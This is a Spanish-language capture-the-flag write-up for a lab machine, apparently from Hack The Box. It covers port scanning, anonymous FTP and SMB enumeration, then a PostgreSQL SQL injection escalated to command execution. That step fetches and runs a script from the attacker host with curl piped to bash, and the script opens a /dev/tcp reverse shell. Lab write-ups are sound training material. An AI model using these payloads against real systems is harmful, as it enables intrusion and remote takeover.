`nmap -p- -open --min-rate 5000 -sS -n -Pn -vvv 10.10.10.236 -oG Allports`
```ad-done
21/tcp  
22/tcp  
135/tcp 
139/tcp 
443/tcp 
445/tcp 
```


`nmap -p21,22,135,139,443,445 -sCV 10.10.10.236 -oN targeted`
```ad-done
21/tcp  open  ftp           FileZilla ftpd 0.9.60 beta
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp  open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA)
|   256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA)
|_  256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519)
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp open  ssl/http      Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR
| Not valid before: 2020-02-18T17:45:56
|_Not valid after:  2021-02-17T17:45:56
|_ssl-date: TLS randomness does not represent time
|_http-title: 400 Bad Request
| tls-alpn: 
|_  http/1.1
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

### Info SMB
Para obtener información de la maquina y del SMB un poco podemos usar [[CRACKMAPEXEC-NETEXEC]]
`netexec smb 10.10.10.236`

Listar recursos compartidos a nivel de red usando [[SMBCLIENT]]
`smbclient -L 10.10.10.236 -N`

con [[SMBMAP]]
`smbmap -L 10.10.10.236 -N`


### FTP

Vemos que esta el FTP como anonymous habilitado así que accedemos a el
`ftp 10.10.10.236` listamos el contenido de la maquina y vemos que hay un ejecutable llamado `docker-toolbox.exe`, buscaremos información en internet sobre el es una herramienta que ayuda a correr docker en sistemas que de forma nativa no permiten correr docker


### 443

Podemos ver los certificados ssl conectándonos a la maquina con [[OPENSSL]]
`openssl s_client -connect 10.10.10.236:443`

Vemos que el CommonName es `admin.megalogistic.com` así que lo añadiremos al archivo de configuración `/etc/hosts`

Así podemos acceder a el a través del navegador y podemos ver la pagina web y nos encontramos con un panel de login

Si en el panel de login ponemos unas comillas simples podemos ver que nos muestra información de la base de datos

Estamos viendo que se usa PostgreSQL

Abriremos [[BURPSUITE]] para interceptar el trafico y poder manipular la petición

### PostgreSQL

Buscaremos la información en HackTricks
Probaremos con una petición que trabaja con tiempo y al hacerla hace que se tarden 10 segundos en responder
`';select pg_sleep(10);-- -`

Nos damos cuenta que tarda 10 segundos en responder así que es vulnerable a SQLinjection

Para la versión 9.3 se puede elevar la inyección SQL a un RCE ejecución remota de comandos, tenemos toda la información en HackTricks

Primero vamos a crear una tabla
`';CREATE+TABLE+cmd_exec(cmd_output+text);-- -`

Ahora vamos a ejecutar un comando
`';COPY+cmd_exec+FROM+PROGRAM+'curl+10.10.16.13/test|bash';--+-`

- Antes deberemos crearnos el archivo test con:
```bash
 #!/bin/bash
 
 bash -i >& /dev/tcp/10.10.16.13/443 0>&1
```

- Y nos levantaremos un servidor con Python
	`python3 -m http.server 80`

- Y nos ponemos en escucha también
	`nc -lvnp 443`

Ganaremos acceso a un contenedor que esta en la maquina, si ejecutamos un `Hostname -I` nos mostrara la IP de este contenedor `172.17.0.2`

Deberemos hacer le tratamiento de la tty
	`script /dev/null -c bash`
	`CTRL + Z`
	`stty raw -echo; fg`
	`reset xterm`
	`export TERM=xterm`
	`export SHELL=bash`
	



